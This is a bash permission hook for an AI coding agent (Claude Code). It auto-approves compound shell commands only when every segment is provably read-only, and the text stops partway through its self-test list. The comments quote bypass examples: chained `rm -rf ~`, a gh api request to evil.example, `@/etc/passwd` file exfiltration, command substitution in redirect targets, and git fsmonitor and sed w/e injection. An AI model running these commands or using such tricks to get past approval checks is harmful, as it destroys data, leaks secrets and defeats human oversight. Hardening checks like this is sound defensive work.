#!/usr/bin/env bash
# PermissionRequest hook helper:
# Bash の複合コマンドを &&/||/;/|/改行 で分割し、各セグメントが
# safe-prefix に該当するときだけ allow を返す。1 つでも該当しない
# セグメントがあれば `{}` を返して静的ルールに委譲する。
#
# Why segments instead of prefix-only:
#   現行フックは「コマンド先頭が gh api か」しか見ていないため、
#   `echo "..." && gh api ...` のような連結が auto-allow から
#   外れていた。一方で先頭以外を素通しすると `rm -rf foo && gh api ...`
#   のような不正連結も通ってしまう。各セグメントを safe-prefix に
#   照合することで両立する。
#
# Why the safe-prefix list is generated, not hardcoded:
#   静的 allow の `Bash(<cmd> *)` を変えるたびに hook の許容範囲も
#   同期させたいが、手で 2 箇所メンテすると必ずズレる。setup.sh が
#   settings.json から `Bash(<word>)` / `Bash(<word> *)` の単純パターン
#   だけを抽出して `segment-allow.prefixes` に書き出すことで、
#   静的 allow ⊇ hook 許容範囲 を build-time に保証する。
#   `git -C * status *` のような複合パターンは抽出から除外している。
#
# Scope: gh api と `git -C <path> <ホワイトリスト済みサブコマンド>` の auto-allow を担う。
# どんなに safe-prefix を満たしていても、この 2 つを 1 つも含まない
# コマンドは passthrough し、静的ルールの ask 判定に委ねる。
#
# Usage:
#   1) フック本体: stdin に Claude Code が渡す JSON を受け取り、
#      適切な PermissionRequest decision を stdout に出す。
#   2) セルフテスト: `bash segment-allow.sh --self-test`

set -euo pipefail

# build-time に setup.sh が生成する safe-prefix リスト。1 行 1 パターンで、
# 各行は bash の glob として `[[ "$seg" == $pattern ]]` で照合される。
# ファイルが無い場合は echo / printf / jq の最小セットへフォールバックし、
# setup.sh 未実行の状態でも壊れないようにする。
SAFE_PREFIX_FILE="${SAFE_PREFIX_FILE:-$HOME/.claude/hooks/segment-allow.prefixes}"

# has_dangerous_shape / tokenize_quoted / DOTFILES_SKILLS_DIR は
# escalate-unsafe-bash.sh と共有 (lib/ も ~/.claude/hooks/lib/ にリンクされる前提。setup.sh)。
source "$(dirname "${BASH_SOURCE[0]}")/lib/bash-safety.sh"

# 安全プレフィクスを配列に読み込む。コメント行 (# で始まる) と空行は無視。
load_safe_prefixes() {
  SAFE_PREFIXES=()
  if [ -r "$SAFE_PREFIX_FILE" ]; then
    local line
    while IFS= read -r line; do
      [ -z "$line" ] && continue
      case "$line" in '#'*) continue ;; esac
      SAFE_PREFIXES+=("$line")
    done < "$SAFE_PREFIX_FILE"
  else
    SAFE_PREFIXES=('echo' 'echo *' 'printf' 'printf *' 'jq *')
  fi
}

# セグメントの前後空白を取り除く
trim() {
  local s="$1"
  s="${s#"${s%%[![:space:]]*}"}"
  s="${s%"${s##*[![:space:]]}"}"
  printf '%s' "$s"
}

# クォート（' " `）を尊重しつつ &&, ||, ;, |, 改行 で分割する。
# trim 済み・空文字を除いたセグメントを NUL 区切りで stdout に出す。
# クォート内の演算子は分割されない。
#
# Why NUL 区切り: セグメント自身が改行を含みうる（`-f query='<改行>...'` の
# ような複数行クォート引数）。改行区切りで返すと呼び出し側の `read -r` が
# 1 セグメントを複数セグメントに割ってしまい、クエリ本文の断片が
# 「safe-prefix に無いコマンド」と誤判定されて allow が落ちる。
split_segments() {
  local cmd="$1"
  local i=0 len=${#cmd} ch next
  local in_single=0 in_double=0 in_backtick=0
  local seg=""
  # ダブルクォート内のバックスラッシュ連長: 偶数なら閉じクォートが活きる
  local bs_run=0

  _emit() {
    local t
    t="$(trim "$seg")"
    [ -n "$t" ] && printf '%s\0' "$t"
    seg=""
  }

  while [ "$i" -lt "$len" ]; do
    ch="${cmd:$i:1}"
    next=""
    if [ $((i+1)) -lt "$len" ]; then
      next="${cmd:$((i+1)):1}"
    fi

    if [ "$in_single" = 1 ]; then
      seg+="$ch"
      [ "$ch" = "'" ] && in_single=0
    elif [ "$in_double" = 1 ]; then
      seg+="$ch"
      if [ "$ch" = '\' ]; then
        bs_run=$((bs_run+1))
      elif [ "$ch" = '"' ]; then
        # 直前のバックスラッシュ列が偶数個ならクォート閉じ
        if [ $((bs_run % 2)) -eq 0 ]; then
          in_double=0
        fi
        bs_run=0
      else
        bs_run=0
      fi
    elif [ "$in_backtick" = 1 ]; then
      seg+="$ch"
      [ "$ch" = '`' ] && in_backtick=0
    else
      case "$ch" in
        "'") in_single=1; seg+="$ch" ;;
        '"') in_double=1; bs_run=0; seg+="$ch" ;;
        '`') in_backtick=1; seg+="$ch" ;;
        '\')
          # why エスケープされた 1 文字を持ち越す: クォート外の `\` は次の 1 文字を
          # リテラル化するので、そこに現れる改行は区切りではなく行継続になる。
          # 分割してしまうと、実 bash では 1 コマンドの引数だったトークンが
          # 独立セグメントとして safe prefix に照合され、素通りしうる。
          # 次の文字ごと seg に残せば改行はセグメント内に留まり、
          # has_unsafe_metachar がクォート外改行として unsafe に倒す。
          seg+="$ch"
          if [ -n "$next" ]; then
            seg+="$next"
            i=$((i+1))
          fi
          ;;
        '&')
          if [ "$next" = '&' ]; then
            _emit
            i=$((i+1))
          else
            seg+="$ch"
          fi
          ;;
        '|')
          if [ "$next" = '|' ]; then
            _emit
            i=$((i+1))
          else
            _emit
          fi
          ;;
        ';'|$'\n')
          # why 改行を `;` と同列に置く: bash では改行はコマンド区切りそのもので、
          # 区切りとして扱わないと複数行コマンドが 1 セグメントに潰れ、
          # has_unsafe_metachar のクォート外改行チェックに当たって中身が
          # 何であれ ask に倒れていた。分割してから 1 つずつ safe 判定する方が
          # 判定は精密になる（緩むのではなく、各行が個別に白名簿を通る）。
          # 行継続 `\<改行>` は上の '\' 分岐が食うのでここには来ない。
          _emit
          ;;
        *) seg+="$ch" ;;
      esac
    fi
    i=$((i+1))
  done
  _emit
}

# セグメント（trim 済み）がクォート外に危険なシェルメタ文字を含むか判定する。
# 0: 含む(危険) / 1: 含まない
#
# Why: 末尾 glob の prefix 照合はセグメント先頭のコマンド名しか守れない。
#   split_segments が分割するのは &&/||/;/|/改行 だけなので、単一 & (バックグラウンド)・
#   行継続 `\<改行>` で持ち越されたクォート外改行・$()・`` ` ``・サブシェル ()・
#   入出力リダイレクト < > は 1 セグメント内に
#   残り、`echo *` 等の safe prefix にマッチして素通りしてしまう。
#   例: `gh api foo & rm -rf ~` は 1 セグメントで `gh api ` 始まり扱いになる。
#   これらを含むセグメントは prefix が何であれ unsafe に倒す（構造の白名簿化）。
# 位置 $2 から「副作用の無いリダイレクト」が単語として始まっているかを判定する
# (純粋関数)。該当したら読み飛ばすべき文字数を _NOOP_REDIRECT_LEN に置く。
# 0: 該当 / 1: 非該当
#
# 対象は fd 複製の `2>&1` と /dev/null への出力破棄のみ。どちらもファイル生成も
# コマンド実行も伴わず、/dev/null は書き込みが常に捨てられる特殊デバイスなので
# リダイレクト先の変動もない。
#
# why 単語境界を要求する: 境界を見ないと `12>&1`(fd 12 の複製) の途中から
# 4 文字を消して先頭の `1` だけを残すような、実 bash の解釈とズレた読み方に
# なる。前後が空白か端であることを確かめてから読み飛ばす。
# why 長いリテラルを先に試す: `1>/dev/null` は前方境界チェックにより `>` の
# 位置からは一致しない（直前が `1` で空白でない）ので二重に読み飛ばされないが、
# 照合順を長い順にしておけば将来リテラルを増やしても同じ性質が保たれる。
# why 空白入り (`2> /dev/null`) を対象外にする: 既存の `2>&1` が `2>& 1` を
# 通さないのと揃える。読み飛ばしをリテラル一致に閉じておくほうが安全側。
_NOOP_REDIRECT_LEN=0
_is_word_bounded_noop_redirect() {
  local s="$1" i="$2" len="$3" lit n prev next
  _NOOP_REDIRECT_LEN=0
  if [ "$i" -gt 0 ]; then
    prev="${s:$((i-1)):1}"
    case "$prev" in ' '|$'\t') ;; *) return 1 ;; esac
  fi
  for lit in '2>/dev/null' '1>/dev/null' '&>/dev/null' '>/dev/null' '2>&1'; do
    n=${#lit}
    [ "${s:$i:$n}" = "$lit" ] || continue
    if [ $((i+n)) -lt "$len" ]; then
      next="${s:$((i+n)):1}"
      case "$next" in ' '|$'\t') ;; *) continue ;; esac
    fi
    _NOOP_REDIRECT_LEN="$n"
    return 0
  done
  return 1
}

# ' " ` のクォートは尊重するが、ダブルクォート内でも $ と ` は展開されるため危険とみなす。
# gh api の /tmp リダイレクト例外は、呼び出し側が > を剥がしてからこの関数に渡す。
#
# 例外: 単語として現れる `2>&1` と `>/dev/null` 系だけは読み飛ばす。fd の複製と
#   出力の破棄だけでファイル書き込みもコマンド実行も伴わないうえ、
#   `gh api ... 2>/dev/null | head` の形で多用するため。単語境界を要求するので
#   `&>file`（全出力をファイルへ）や `2>file` は従来通り検出される。読み飛ばすのは
#   一致したリテラルの長さちょうどなので、`2>&1 & rm -rf ~` のように後続に別の
#   メタ文字が続く形も取りこぼさない。
has_unsafe_metachar() {
  local s="$1"
  local i=0 len=${#s} ch
  local in_single=0 in_double=0 bs_run=0
  while [ "$i" -lt "$len" ]; do
    ch="${s:$i:1}"
    # why リダイレクト開始文字だけを先に見る: この関数は 1 文字ずつ全体を走査する
    # ので、数千文字の GraphQL クエリでは関数呼び出しがそのまま本数になる。
    # 読み飛ばし候補が始まりうる文字に絞ってから判定関数を呼ぶ。
    if [ "$in_single" = 0 ] && [ "$in_double" = 0 ]; then
      case "$ch" in
        '2'|'1'|'>'|'&')
          if _is_word_bounded_noop_redirect "$s" "$i" "$len"; then
            i=$((i+_NOOP_REDIRECT_LEN))
            continue
          fi
          ;;
      esac
    fi
    if [ "$in_single" = 1 ]; then
      [ "$ch" = "'" ] && in_single=0
    elif [ "$in_double" = 1 ]; then
      if [ "$ch" = '\' ]; then
        bs_run=$((bs_run+1))
      elif [ "$ch" = '"' ]; then
        [ $((bs_run % 2)) -eq 0 ] && in_double=0
        bs_run=0
      elif [ "$ch" = '$' ] || [ "$ch" = '`' ]; then
        return 0
      else
        bs_run=0
      fi
    else
      case "$ch" in
        "'") in_single=1 ;;
        '"') in_double=1; bs_run=0 ;;
        '\')
          # why エスケープされた 1 文字を読み飛ばす: クォート外の `\` は次の 1 文字を
          # リテラル化する。読み飛ばさないと `\"` / `\'` が擬似的なクォート区間を開き、
          # その中の & > < ( ) が「クォート内だから安全」と誤判定されて素通りする。
          # 例: `echo \"a&rm -rf ~` は bash では `echo "a` をバックグラウンド実行して
          # `rm -rf ~` を走らせるが、`"` 以降をクォート内とみなすと `&` が見えず
          # `echo *` に一致して allow に落ちていた。
          # 逆にリテラル化された 1 文字は制御演算子になり得ないので、飛ばしても
          # 検出漏れは生まれない。
          if [ $((i+1)) -lt "$len" ]; then
            # `\<改行>` だけは例外。split_segments が行継続として分割せず
            # セグメント内に残す目印なので、ここで unsafe に倒して ask へ送る。
            [ "${s:$((i+1)):1}" = $'\n' ] && return 0
            i=$((i+1))
          fi
          ;;
        '$'|'`'|'&'|'('|')'|'<'|'>') return 0 ;;
        *) [ "$ch" = $'\n' ] && return 0 ;;
      esac
    fi
    i=$((i+1))
  done
  return 1
}

# `gh api graphql` セグメント（trim 済み前提）が read-only と確認できるか判定する。
# 0: safe / 1: not safe
#
# Why 専用判定: GraphQL は参照クエリでも本文を `-f query=...` で渡す必要があり、
#   汎用の書き込みフラグ判定（-f/-F を一律 write とみなす）だと introspection の
#   ような純粋な参照まで必ず ask に落ちる。
# Why `mutation` 文字列を軸にする: GraphQL の書き込みは mutation operation でしか
#   起こせず、mutation は必ず `mutation` キーワードを伴う（キーワード省略の
#   shorthand `{...}` は spec 上 query 固定）。よって「セグメントのどこにも
#   mutation が現れない」と言えれば、そのリクエストは読み取りに限られる。
#   エイリアスやフラグメント経由で mutation を呼ぶ抜け道は GraphQL には無い。
# 値が読めない形（--input / -F の @file・@-）は「mutation が無い」を証明できないので
# 一律 unsafe。--method も GraphQL では不要なうえ判定面を増やすだけなので弾く。
is_safe_gh_graphql() {
  local seg="$1"
  local t v pending=0

  # why トークン分割前に全体を見る: 複数行クエリはトークン内の改行で
  # tokenize_quoted の出力が複数行に割れ、2 行目以降が「フラグでもフラグの値でもない
  # トークン」として素通りする。`-f query='<改行>mutation {...}'` で検査をすり抜ける
  # ため、mutation 判定はトークン化に依存させない。
  # 大小文字無視で弾くので `__type(name:"Mutation")` のような参照も落ちるが、
  # false positive は ask に落ちるだけで実害が無い。
  case "$seg" in
    *[Mm][Uu][Tt][Aa][Tt][Ii][Oo][Nn]*) return 1 ;;
  esac

  while IFS= read -r t; do
    if [ "$pending" = 1 ]; then
      pending=0
      _gh_graphql_value_ok "$t" || return 1
      continue
    fi
    case "$t" in
      # --hostname は送信先ホストを差し替える (https://<host>/api/graphql へ飛ぶ)。
      # REST 側と違いエンドポイントは graphql 固定なので、host 差し替えだけが
      # 外部への送信路になる。
      -X*|--method*|--input*|--hostname*) return 1 ;;
      -f|-F|--field|--raw-field) pending=1 ;;
      --field=*)     v="${t#--field=}";     _gh_graphql_value_ok "$v" || return 1 ;;
      --raw-field=*) v="${t#--raw-field=}"; _gh_graphql_value_ok "$v" || return 1 ;;
      # why 先頭の `=` を剥がす: pflag の短縮形は `-F=key=value` も
      # `-Fkey=value` と同じに解釈する (`gh api graphql -F=query=@file` が実際に
      # 通ることを実測)。剥がさないと値が `=query=@file` になり、
      # _gh_graphql_value_ok が key を `` / val を `query=@file` と読んで
      # 先頭 `@` 判定をすり抜ける。ファイル本文はセグメントに現れないので
      # mutation スキャンも効かず、任意の mutation が allow で通ってしまう。
      -f?*|-F?*)     v="${t#-?}"; v="${v#=}"; _gh_graphql_value_ok "$v" || return 1 ;;
    esac
  done < <(tokenize_quoted "$seg")

  # 末尾がフラグだけで値が続かない形は解釈できないので unsafe に倒す。
  [ "$pending" = 0 ]
}

# `key=value` 形式のフィールド指定が検査可能な値かを判定する。
# 0: ok / 1: not ok
_gh_graphql_value_ok() {
  local kv="$1" val
  # gh のフィールド指定は必ず key=value 形式（gh api --help）。そうでない値は
  # フラグの取り違え（`-f -X POST` のように次のフラグを値として食う形）を意味し、
  # 何が送られるか読めないので解釈不能として弾く。
  case "$kv" in
    *=*) val="${kv#*=}" ;;
    *)   return 1 ;;
  esac
  # -F は値が @ で始まるとファイル / stdin から読み込む（gh api --help）。中身を
  # 検査できないので弾く。-f は @ を展開しないが、区別せず落とした方が判定が
  # 単純で、`-f key=@x` を実際に使う場面も無い。
  case "$val" in '@'*) return 1 ;; esac
  return 0
}

# `gh api <REST エンドポイント>` セグメント（trim 済み前提）が read-only と
# 確認できるか判定する。0: safe / 1: not safe
#
# Why 専用判定に切り出した: 以前は「-X* / --method* / -f* / -F* / --field* /
#   --raw-field* / --input* のどれも含まない」ことだけを見ていた。この形は
#   `gh api -X GET repos/o/r/contents/x --jq '.content'` のような純粋な読み取りも
#   一律 unsafe にする。実ログでは gh api 由来の unsafe セグメント 165 件のうち
#   68 件が `-X GET` / `--method GET` の読み取りだった。
#
# Why セグメントに `://` があれば無条件 unsafe: gh api はエンドポイントに scheme
#   付き URL を書くと GitHub ではなく任意のホストへリクエストを送る (127.0.0.1 の
#   listener で受信を実測)。同じリポジトリの escalate-unsafe-bash.sh が非 localhost
#   の curl を ask に格上げしている方針と食い違うので塞ぐ。トークン位置ではなく
#   セグメント全体を見るのは、値を取るフラグ (-H / -q / -t 等) の arity を hook が
#   知らずに済ませるため。arity を取り違えるとエンドポイント位置の判定がずれて
#   `gh api -H "X: y" https://evil.example/x` が素通りする。
#
# Why メソッドは「出現した全部が GET」を要求する: pflag は同じフラグを複数回
#   渡すと後勝ちなので、1 つ GET を見た時点で確定させると `-X GET -X DELETE` を
#   通す。後勝ちの検証には実際に DELETE を飛ばす必要があるため、順序を知らなくても
#   安全側に倒れる条件にしている。
#
# Why GET 明示時だけ -f / -F を通す: gh api --help に「パラメータを足すとメソッドが
#   POST に切り替わる。GET のクエリ文字列として送るには --method GET を使う」と
#   明記されている。GET が明示されていればパラメータはクエリ文字列でボディではない。
#   値の検査は graphql 側と同じ _gh_graphql_value_ok に委ね、@file / @- を落とす
#   (ローカルファイルの中身がクエリに乗って外部へ出る形なので GET でも通さない)。
#
# 残る誤差: 値を取るフラグの値が偶然 `-X` で、その次が `GET` だと saw_method が
#   立つ (`gh api -q -X GET -f k=v`)。この形は実際の gh ではエンドポイントが
#   リテラル `GET` になり、エンドポイントを選ぶには bare トークンが 2 つ必要で
#   gh 自身の引数個数チェックに落ちる。書き込み先を選べないので実害にならない。
is_safe_gh_rest() {
  local seg="$1"
  local t fv pending='' saw_method=0 bad_method=0 has_field=0

  case "$seg" in *'://'*) return 1 ;; esac

  # why トークン化前に改行を弾く: tokenize_quoted は改行を含むトークンでも出力を
  # 改行区切りにするため、クォート内改行を持つ値が呼び出し側の `read -r` で複数
  # トークンに割れる。`-f 'title=x<改行>-X<改行>GET'` は「値 title=x」+「-X」+
  # 「GET」と読まれ、実際には GET 指定の無い POST (= 書き込み) なのに
  # 「GET 明示 + パラメータ」に見えて allow で通ってしまう。クォート外の改行は
  # split_segments が既に分割済みなので、ここに残る改行は必ずトークン内側。
  # is_safe_sed / is_safe_git_c と同じ扱いに揃える。
  case "$seg" in *$'\n'*) return 1 ;; esac

  while IFS= read -r t; do
    if [ -n "$pending" ]; then
      case "$pending" in
        method) saw_method=1; [ "$t" = 'GET' ] || bad_method=1 ;;
        field)  has_field=1;  _gh_graphql_value_ok "$t" || return 1 ;;
      esac
      pending=''
      continue
    fi
    case "$t" in
      # ボディ送信と送信先ホストの差し替えは値を検査できないので一律 unsafe。
      --input*|--hostname*) return 1 ;;
      -X|--method)   pending=method ;;
      --method=*)    saw_method=1; [ "${t#--method=}" = 'GET' ] || bad_method=1 ;;
      -X?*)          saw_method=1; [ "${t#-X}" = 'GET' ]        || bad_method=1 ;;
      -f|-F|--field|--raw-field) pending=field ;;
      --field=*)     has_field=1; _gh_graphql_value_ok "${t#--field=}"     || return 1 ;;
      --raw-field=*) has_field=1; _gh_graphql_value_ok "${t#--raw-field=}" || return 1 ;;
      # why 先頭の `=` を剥がす: is_safe_gh_graphql と同じ pflag の短縮形 quirk。
      # `-F=body=@/etc/passwd` を剥がさずに渡すと @ 判定をすり抜け、GET 明示さえ
      # あればローカルファイルの中身がクエリ文字列に乗って外部へ出てしまう。
      -f?*|-F?*)     has_field=1; fv="${t#-?}"; _gh_graphql_value_ok "${fv#=}" || return 1 ;;
    esac
  done < <(tokenize_quoted "$seg")

  # 末尾がフラグだけで値が続かない形は解釈できないので unsafe に倒す。
  [ -z "$pending" ] || return 1
  [ "$bad_method" = 0 ] || return 1
  # パラメータを足すとメソッドは POST になる。GET の明示が無ければ通せない。
  [ "$has_field" = 0 ] || [ "$saw_method" = 1 ] || return 1
  return 0
}

# `sed ...` セグメント（trim 済み前提）が「行範囲の表示だけ」と確認できるか判定する。
# 0: safe / 1: not safe
#
# Why 専用判定: 静的 allow の `Bash(sed *)` は glob 照合なので
#   `sed -n '60,90p'` と `sed -i '' 's/x/y/' ~/.zshrc` を区別できない。
#   `Bash(sed -n *)` に絞っても `sed -n -i.bak 's/x/y/' f` が同じ glob に一致する。
#   引数の意味を見ないと読み書きを分けられないので gh api と同じく hook が負う。
#
# Why ブラックリストではなくホワイトリスト: sed の副作用の口は `-i` だけではない。
#   スクリプト本文の `w file` / `s///w file` は任意ファイルへ書き出し、GNU sed の
#   `e` コマンドと `s///e` フラグはシェルコマンドを実行する (BSD には無い)。
#   フラグだけ見る判定はこれらを丸ごと素通りさせ、実装や版が変わるたびに黙って
#   穴が開く。「数値アドレス + p」しか受理しなければ、w も e も s も文字として
#   現れる余地そのものが無くなる。
#
# Why -n 以外のフラグを一律拒否する: 引数を取るフラグが混ざると「次のトークンは
#   何か」の解釈が必要になり、それが実装で食い違う。BSD の `-i` は次の引数を拡張子
#   として食い、`-e` はスクリプトを食う。`-l` は BSD では引数なし(行バッファリング)
#   だが GNU では数値を取る(l コマンドの折り返し幅)。-n 以外を落とせば arity を
#   解釈する必要そのものが消える。無害な `-E` / `-u` も、受理面を広げるほど
#   「表示しかしない」証明が長くなるので入れない。
is_safe_sed() {
  local seg="$1"

  # why トークン化前に改行を弾く: tokenize_quoted は改行を含むトークンでも
  # 出力を改行区切りにするため、クォート内改行を持つスクリプトが呼び出し側の
  # `read -r` で複数トークンに割れる。`sed -n '1,5p<改行>w /tmp/x'` は
  # 「スクリプト `1,5p`」+「入力ファイル名 `w /tmp/x`」と読まれ、実際には
  # sed の w コマンド (任意ファイルへの書き出し) や GNU の e コマンド
  # (シェルコマンド実行) が allow で通ってしまう。is_safe_gh_graphql が
  # mutation 判定をトークン化に依存させないのと同じ理由で、ここでは
  # 改行を含むセグメントそのものを受理しない。
  case "$seg" in
    *$'\n'*) return 1 ;;
  esac

  # 数値アドレス (+ 最終行 `$`) を p で表示するだけのスクリプト。
  # `/re/p` を含めない: 区切り文字の変更 (`\%re%p`) やエスケープの解釈が必要になり、
  # 「スクリプトに w / e が現れない」を機械的に言えなくなる。
  local script_re='^[0-9]+(,([0-9]+|\$))?p$'
  local t first=1 saw_n=0 saw_script=0

  while IFS= read -r t; do
    if [ "$first" = 1 ]; then
      first=0
      # `/usr/bin/sed` や `command sed` は対象外 (素の sed だけを見る)。
      [ "$t" = 'sed' ] || return 1
      continue
    fi
    case "$t" in
      -n|--quiet|--silent) saw_n=1 ;;
      # `-` (標準入力オペランド) もここで落ちる。読み取り専用だが受理面を
      # 増やさない方針に倒す。
      -*) return 1 ;;
      *)
        # sed は最初の非フラグオペランドをスクリプトとして解釈する。2 個目以降は
        # 入力ファイル名で、読むだけなので受理する (cat * / head * が任意パスで
        # 静的 allow 済みなのと揃える)。
        if [ "$saw_script" = 0 ]; then
          [[ "$t" =~ $script_re ]] || return 1
          saw_script=1
        fi
        ;;
    esac
  done < <(tokenize_quoted "$seg")

  [ "$saw_n" = 1 ] && [ "$saw_script" = 1 ]
}

# `git -C <path> <ホワイトリスト済みサブコマンド> ...` を構造判定する。
#
# why 静的 allow ではなく hook で見るか:
#   `Bash(git -C * status)` は glob 照合なので `*` が空白をまたぎ、
#   `git -C /tmp -c core.fsmonitor='任意コマンド' status` にも一致する。
#   core.fsmonitor は status / diff / fetch / ls-files が index を更新する際に、
#   diff.external は diff の実行時に、いずれも無条件で起動される (実測)。
#   パスを実値に固定しない限り glob ではこの差し込みを排除できず、
#   Claude Code 自身も起動時に該当ルールを警告する。そこで allow から外し、
#   「サブコマンドより前に `-C <path>` 以外のトークンが無い」ことを
#   トークン単位で確認した上で hook が allow を返す。
#
# why サブコマンドより後ろのオプションは見ないか:
#   `--upload-pack` / `--output` / `--ext-diff` は確かに危険だが、それは
#   `-C` を含まない `Bash(git diff *)` 等でも同様に通る (実測)。ここだけ絞ると
#   同じ操作が -C の有無で通ったり通らなかったりする二重基準になるので、
#   -C なし版と同水準に揃える。後ろ側の緩和は PreToolUse (escalate-unsafe-bash.sh)
#   の担当で、そちらは allow を ask に格上げする方向なので別途扱う。
is_safe_git_c() {
  local seg="$1"

  # why トークン化前に改行を弾く: tokenize_quoted は改行を含むトークンでも
  # 出力を改行区切りにするため、クォート内改行があるとトークン境界がずれて
  # サブコマンド位置を誤読する (is_safe_sed と同じ罠)。
  case "$seg" in
    *$'\n'*) return 1 ;;
  esac

  local t first=1 saw_c=0 saw_path=0 sub='' subarg=''

  while IFS= read -r t; do
    if [ "$first" = 1 ]; then
      first=0
      # `/usr/bin/git` / `command git` / `sudo git` は対象外 (素の git だけを見る)。
      [ "$t" = 'git' ] || return 1
      continue
    fi
    if [ "$saw_c" = 0 ]; then
      # -C 以外が先に来る形 (`git -c ...` / `git --exec-path=... -C ...`) は、
      # 安全かを個別に判断できないので受理しない。`-C/path` の連結形もここで落ちる。
      [ "$t" = '-C' ] || return 1
      saw_c=1
      continue
    fi
    if [ "$saw_path" = 0 ]; then
      # `git -C -c core.pager=x status` のようにパス位置へオプションが来る形を弾く。
      case "$t" in -*) return 1 ;; esac
      saw_path=1
      continue
    fi
    if [ -z "$sub" ]; then
      sub="$t"
      continue
    fi
    if [ -z "$subarg" ]; then
      subarg="$t"
    fi
  done < <(tokenize_quoted "$seg")

  [ "$saw_path" = 1 ] || return 1

  # 許すサブコマンドは、静的 allow から外した `Bash(git -C * <sub>)` と同じ集合に限る
  # (hook 化で許可範囲を広げない)。
  # why 「読み取り専用」ではない: fetch は ref/object を、branch -D は ref を、
  # remote add / worktree add|remove はリポジトリの構成そのものを書き換える。
  # それでも通すのは、-C なし版 (`Bash(git fetch *)` 等) が静的 allow に載っており、
  # -C の有無で同じ操作の可否が変わる二重基準を作らないため。追加するときの基準は
  # 「読み取り専用か」ではなく「-C なし版が静的 allow にあるか」。
  case "$sub" in
    status|log|diff|show|branch|fetch|remote|blame|rev-parse|ls-files|check-ignore|worktree)
      return 0
      ;;
    # 引数なしの `git stash` は変更の退避 (書き込み) なので list に限定する。
    stash)
      [ "$subarg" = 'list' ] && return 0
      return 1
      ;;
  esac
  return 1
}

# 単一セグメント（trim 済み前提）が safe-prefix に該当するか判定する。
# 0: safe / 1: not safe
is_safe_segment() {
  local seg="$1"
  [ -z "$seg" ] && return 1

  # gh api の出力を一時ファイルへ保存する `> /tmp/...` / `>> /tmp/...` は
  # 実運用で多用するため例外的に許可する。リダイレクト先は /tmp/ 配下の
  # リテラルパス（空白・変数展開・.. を含まない）に限定し、リダイレクト部を
  # 剥がして残りを通常判定に回す。/tmp 以外・変数展開ありのリダイレクトは
  # ここでマッチせず、後段の has_unsafe_metachar が > を検出して unsafe にする。
  case "$seg" in
    'gh api '*'>'*)
      # why リダイレクト先の許可文字を制限: 以前は [^[:space:]]+ で任意文字を
      # 受けていたため `> /tmp/$(id).json` のようなコマンド置換がリダイレクト先
      # に紛れ込んでも剥がされて後段の has_unsafe_metachar に届かず ALLOW された
      # (finding #0)。英数字・.・/ ・_・- だけに絞ることで $ ` ( ) 等を構造的に排除する。
      if [[ "$seg" =~ ^(gh\ api\ [^\>]*[^\>[:space:]])[[:space:]]*'>''>'?[[:space:]]*(/tmp/[A-Za-z0-9._/-]+)$ ]] \
         && [[ "${BASH_REMATCH[2]}" != *..* ]]; then
        seg="${BASH_REMATCH[1]}"
      fi
      ;;
  esac

  # クォート外の危険メタ文字（& $ ` ( ) < > 改行）を含むなら不許可。
  if has_unsafe_metachar "$seg"; then
    return 1
  fi

  # escalate-unsafe-bash.sh と同じ危険形チェック (find -exec/-delete・非localhost
  # curl・第三者スキル実行)。これが無いと、escalate 側が ask に格上げした危険形も
  # `gh api` と連結するだけで PermissionRequest 側が allow に戻してしまう (finding #1)。
  # why >/dev/null: has_dangerous_shape は該当時に理由を stdout へ printf する。
  # ここでは真偽だけ使うので、捨てないとフックの JSON 出力に理由文字列が混入する。
  if has_dangerous_shape "$seg" >/dev/null; then
    return 1
  fi

  # gh api は「読み取りに限られると証明できるとき」だけ safe。静的 allow には
  # Bash(gh api *) が無い前提で、hook が auto-allow の責務を負う。判定は
  # エンドポイントの種類で 2 本に分かれる (is_safe_gh_rest / is_safe_gh_graphql)。
  # どちらもトークンに分割して見る。glob やブロックリスト正規表現では long form
  # (--field/--raw-field) や連結形 (-XDELETE / -Ftitle=x) を取りこぼすため。
  case "$seg" in
    # graphql エンドポイントだけは -f query=... が参照でも必須なので別判定に回す。
    'gh api graphql'|'gh api graphql '*)
      is_safe_gh_graphql "$seg" && return 0
      return 1
      ;;
    'gh api '*)
      is_safe_gh_rest "$seg" && return 0
      return 1
      ;;
    # sed も静的 allow には載せず (glob では読み書きを分けられない)、
    # 行範囲の表示だけと証明できるときに hook が auto-allow する。
    'sed '*)
      is_safe_sed "$seg" && return 0
      return 1
      ;;
    # git -C も静的 allow には載せない (パスの位置にワイルドカードを置くと
    # サブコマンド前へのオプション差し込みを排除できないため)。
    'git -C '*)
      is_safe_git_c "$seg" && return 0
      return 1
      ;;
  esac

  # それ以外は generated prefix list に対する glob match で判定。
  # `[[ ]]` 内は word-splitting されないので $pattern を unquoted にして OK。
  local pattern
  for pattern in "${SAFE_PREFIXES[@]}"; do
    if [[ "$seg" == $pattern ]]; then
      return 0
    fi
  done

  return 1
}

# コマンド全体を分解し、全セグメント safe かつ「hook が責務を負う対象」
# (gh api / git -C) を 1 つ以上含むときだけ allow。どちらも含まないコマンドは
# 静的ルールに委譲する（このフックの役割外）。
evaluate_command() {
  local cmd="$1"
  local has_target=0
  local seg

  # SAFE_PREFIXES が未設定ならファイルから読む。self-test が事前に
  # 配列を仕込んでいる場合はそれを尊重する。
  if [ -z "${SAFE_PREFIXES+x}" ]; then
    load_safe_prefixes
  fi

  while IFS= read -r -d '' seg; do
    if ! is_safe_segment "$seg"; then
      return 1
    fi
    case "$seg" in
      'gh api '*|'git -C '*) has_target=1 ;;
    esac
  done < <(split_segments "$cmd")

  [ "$has_target" = 1 ]
}

emit_allow() {
  printf '%s\n' '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow","message":"compound read-only: gh api (no write flags; graphql without mutation) / git -C <path> <allowlisted subcommand> + segments in safe-prefix list"}}}'
}

emit_passthrough() {
  printf '%s\n' '{}'
}

main() {
  local cmd
  # 不正 JSON / command 欠落では判定せず静的ルールに委ねる（set -e で落とさない）。
  cmd="$(jq -r '.tool_input.command // empty' 2>/dev/null)" || { emit_passthrough; return; }
  [ -z "$cmd" ] && { emit_passthrough; return; }
  if evaluate_command "$cmd"; then
    emit_allow
  else
    emit_passthrough
  fi
}

# ---- self test --------------------------------------------------------------
# テストは判定の純粋関数 evaluate_command に対して行う。
# `bash segment-allow.sh --self-test` で実行できる。
run_self_test() {
  # self-test は本物の prefix ファイルに依存させない。setup.sh が生成する
  # 想定リストの代表例を直接配列に入れてテストする。
  SAFE_PREFIXES=(
    'echo'
    'echo *'
    'printf'
    'printf *'
    # ` *` 由来 → bare と starred の両方を派生させる (Claude Code の静的 allow は
    # `Bash(head *)` で引数なしの head も通すので、bare を落とすと hook だけが狭くなる)
    'jq'
